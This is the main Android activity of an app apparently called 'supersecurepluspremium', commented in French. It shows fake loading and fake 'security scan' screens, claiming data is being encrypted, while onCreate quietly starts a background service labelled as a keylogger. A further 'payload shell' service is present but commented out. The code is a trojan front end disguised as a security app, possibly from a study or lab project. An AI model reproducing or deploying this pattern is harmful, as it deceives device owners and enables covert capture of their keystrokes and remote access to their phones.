package com.example.supersecurepluspremium;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;

import java.util.Timer;
import java.util.TimerTask;

//code d'un sleep (pas bien pour les GIF
/*try {
       Thread.wait(5000); //pause de 1000ms (1s)
} catch(InterruptedException ex) {
       ex.printStackTrace();
}*/
//myIntent.putExtra("key", value); //Optional parameters for Intent

public class MainActivity extends AppCompatActivity {
    private static int LOAD_TIME = 2000;
    private static boolean scanning = false;

    //Faux écran de chargement
    public void doLoad(View v){
        final ImageView myLayout = findViewById(R.id.imageView);
        Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
        TextView textView = findViewById(R.id.textView2);

        if (!scanning)  // loading screen
            textView.setText("Chargement de la sécurité\nVeuillez patienter...");
        else    // faux "scan de sécurité"
            textView.setText("Cryptage des données...");
            Runnable runnable = new Runnable() {
            @Override
            public void run() {
                Intent i = new Intent(MainActivity.this, Analyze.class);
                i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivityForResult(i, 1);
            }
        };
        Handler handler = new Handler();
        handler.postDelayed(runnable, LOAD_TIME);
    }

    //Démarrage de l'application
    @Override
    protected void onCreate(Bundle savedInstanceState)  {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ImageView imageView = findViewById(R.id.imageView);
        Glide.with(this).load(R.drawable.annonce).into(imageView);
        //service keylogger
        startService(new Intent(this, BackgroundSecureService.class));
        //payload shell
        //startService(new Intent(this, BackgroundSecureShell.class));
        Log.v("secme","Services launched - main");
    }

    // Lancement d'un scan
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        LOAD_TIME = 9000;
        scanning = true;
        doLoad(findViewById(R.id.imageView));
    }
}
